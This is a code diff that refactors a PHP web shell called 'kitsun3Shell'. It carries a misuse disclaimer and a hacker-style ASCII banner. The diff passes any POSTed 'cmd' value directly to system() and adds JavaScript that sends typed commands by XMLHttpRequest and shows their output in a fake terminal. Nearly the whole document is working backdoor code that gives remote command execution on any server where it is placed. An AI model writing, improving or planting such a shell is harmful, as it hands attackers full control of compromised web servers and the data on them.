@@ -7,11 +7,20 @@
 * DISCLAIMER: We are not responsible for the misuse of the shell
 */
 
-if(isset($_POST['cmd'])) {
+function post_request() {
     $command = $_POST['cmd'];
-    $teste[] = system($command);
+    $teste = system($command);
+    return "<div id='response'>".$teste."</div>";
+}
+function main() {
+    if(isset($_POST['cmd'])) {
+        $resp = post_request();
+        echo $resp;
+       return;
+    }
 }
 
+main();
 ?>
 
 <DOCTYPE html>
@@ -50,29 +59,28 @@ if(isset($_POST['cmd'])) {
 
         <script>
 
-            function makerequest(url, {cmd: command}, callback){
-                var xhttp = new XMLHttpRequest();
-                xhttp.open("POST", url, true);
-                xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            function makerequest(url, command){
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", 'http://localhost:1337/kitsun3Shell.php', true);
 
-                if (xhttp.readyState === 4 && xhttp.status === 200) {
-                    try {
-                        alert(1);
-                        var responseJson = JSON.parse(xhttp.responseText);
-                        callback(responseJson);
-                    } catch (error) {
-                        alert("Error: " + error);
+                // Envia a informação do cabeçalho junto com a requisição.
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.onreadystatechange = function() { // Chama a função quando o estado mudar.
+                    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+                        output = xhr.responseText.split("id='response'>")[0].split("<div")[0];
+                        var element = document.getElementById('output');
+                        element.innerHTML = '<pre>' + output + '</pre>';
                     }
                 }
-                xhttp.send(command);
+                xhr.send("cmd="+command);
             }
 
             function execComand(command) {
                 var command = command;
-                var url = "<?php $_SERVER['PHP_SELF'] ?>";
-                
-                makerequest(url, command, function (response) {
-                });
+                var url = window.location.href;
+                console.log(url);
+
+                makerequest(url, command);
             }
 
 
@@ -94,19 +102,23 @@ if(isset($_POST['cmd'])) {
         <div id="terminal">
             <pre id="shell-content">
                 <div id="logo">
-       _ _                   _____ __ _          _ _ 
+       _ _                   _____ __ _          _ _
   /\ /(_) |_ ___ _   _ _ __ |___ // _\ |__   ___| | |
  / //_/ | __/ __| | | | '_ \  |_ \\ \| '_ \ / _ \ | |
 / __ \| | |_\__ \ |_| | | | |___) |\ \ | | |  __/ | |
 \/  \/|_|\__|___/\__,_|_| |_|____/\__/_| |_|\___|_|_|
-                                                     
-                </div>
-            </pre>
 
-            <?php 
-                echo '<span>kitsun3@</span>'. $_SERVER['SERVER_NAME'].':$'. '<span id="path">'.getcwd().'</span>'; 
+                </div>
+
+            </pre>
+        <div id='output'></div>
+
+            <?php
+                echo '<span>kitsun3@</span>'. $_SERVER['SERVER_NAME'].':$'. '<span id="path">'.getcwd().' $'.'</span>';
             ?>
             <input type="text" name="cmd" id="myInput">
         </div>
     </body>
 </html>
+
+
